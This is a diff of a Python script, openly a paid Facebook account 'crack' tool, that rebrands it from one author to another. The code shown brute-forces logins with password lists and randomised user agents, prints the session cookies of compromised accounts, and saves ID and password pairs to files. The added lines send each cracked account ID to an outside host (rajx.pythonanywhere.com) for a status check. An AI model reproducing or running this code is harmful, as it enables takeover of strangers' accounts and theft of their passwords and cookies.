@@ -1,8 +1,8 @@
-#SC MAKED BY SHANTO
-#Fuck SHANTO HOSSEN
-#Dec By SHANTO
-#SHANTO Your Reyal Pappa
-#SHANTO Kids Numbar 5
+#SC MAKED BY PARVEJ
+#Fuck PARVEJ HOSSEN
+#Dec By PARVEJ
+#PARVEJ Your Reyal Pappa
+#PARVEJ Kids Numbar 5
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -55,9 +55,10 @@ loop = 0
 oks = []
 cps = []
 
-ua = 'Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36 GSA/11.2.9.21.arm'
-ua = 'Mozilla/5.0 (Linux; U; Android 9; en-gb; CPH1881 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10'
-ua = 'Mozilla/5.0 (Linux; Android 9; STK-LX1 Build/HUAWEISTK-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36 YaApp_Android/10.91 YaSearchBrowser/10.91'
+ua = ["FBAN/FB4A;FBAV/429.0.0.27.114;FBBV/6222334;[FBAN/FB4A;FBAV/411.0.0.4672;FBBV/3905153;FBDM/{density=2.5,width=1959,height=2309};FBLC/en_US;FBRV/967638634;FBCR/Airtel;FBMF/RMX3771;FBBD/Realme;FBPN/com.facebook.lite;FBDV/RMX3771;FBSV/9;FBOP/9;FBCA/x86:armeabi-v7a;]",]
+ua = ["Mozilla/5.0 (Linux; U; Android 13; zh-tw; Xiaomi 13 Pro Build/TKQ1.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.0.5-gn",]
+ua = ["FBAN/FB4A;FBAV/346.0.0.8.76;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/Vivo V2231;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",]
+ua = ["Mozilla/5.0 (Linux; Android 11; MI CC9 Pro Premium Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",]
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -94,21 +95,24 @@ for xd in range(10000):
     l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
-logo = ("""\033[1;33m
-                      █▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-                   ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-                   ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+logo = ("""
+\033[1;33m d8888b.  .d8b.  d8888b. db    db d88888b    d88b 
+\033[1;33m 88  `8D d8' `8b 88  `8D 88    88 88'        `8P' 
+\033[1;32m 88oodD' 88ooo88 88oobY' Y8    8P 88ooooo     88  
+\033[1;32m 88~~~   88~~~88 88`8b   `8b  d8' 88~~~~~     88  
+\033[1;36m 88      88   88 88 `88.  `8bd8'  88.     db. 88  
+\033[1;36m 88      YP   YP 88   YD    YP    Y88888P Y8888P  
                                                  
-\033[1;91m\033[1;41m\033[1;97m              WELCOME TO SHANTO TOOLS               \033[;0m\033[1;91m\033[1;92m
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO PARVEJ TOOLS               \033[;0m\033[1;91m\033[1;92m
 
 \033[1;92m══════════════════════════════════════════
 \033[1;32m[-] TOOLS TYPE:\033[1;32m PAID
-\033[1;32m[-] AUTHOR    :\033[1;32m SHANTO HOSSEN
+\033[1;32m[-] AUTHOR    :\033[1;32m PARVEJ HOSSEN
 \033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
 \033[1;32m[-] FACEBOOK  :\033[1;32m FH Roman
 \033[1;92m══════════════════════════════════════════
 
-\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS SHANTO BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS PARVEJ BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
 
 
 class Main:
@@ -216,10 +220,10 @@ def v3():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' \033[1;33m[♥]  TOTAL IDS :\033[1;92m '+tl)
+        print(' \033[1;33m [♥]  TOTAL IDS :\033[1;92m '+tl)
         print(f"\033[1;33m[♥]  YOUR TERGET CRACK MENU:\033[1;92m {doamin}")
-        print(' \033[1;33m[♥]  THE CRACK PROCESS HAS BEEN STARTED')
-        print(' \033[1;33m[♥]  WAIT FOR IDS ')
+        print(' \033[1;33m [♥]  THE CRACK PROCESS HAS BEEN STARTED')
+        print(' \033[1;33m [♥]  WAIT FOR IDS ')
         print(50*'_')
         for guru in user:
             uid = kode+kodex+kod+guru
@@ -238,7 +242,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mSHANTO\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mPARVEJ\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://free.facebook.com').text
             log_data = {
@@ -278,22 +282,25 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[SHANTO-OK🌻] {uid}|{ps}")
-                print(f"\n[COOKIE🎁] : {coki}")
-                open('/sdcard/SHANTO/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                res = requests.get(f"https://rajx.pythonanywhere.com/live/uid={cid}").text
+                if 'LOCK' in res:
+                    return 'LOCK'
+                else:
+                    print(f'  \r\033[1;92m  [PAJVEJ-OK👨‍💻] '+uid+' • '+ps+'\33[0;92m')
+                    print(f'  \r\033[1;92m  [COOKIE] '+coki)
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[SHANTO-CP❌] {uid}|{ps}")
-                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                print(f"\x1b[38;5;196m[PARVEJ-CP❌] {uid}|{ps}")
+                open('/sdcard/PARVEJ-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[SHANTO-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[PARVEJ-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
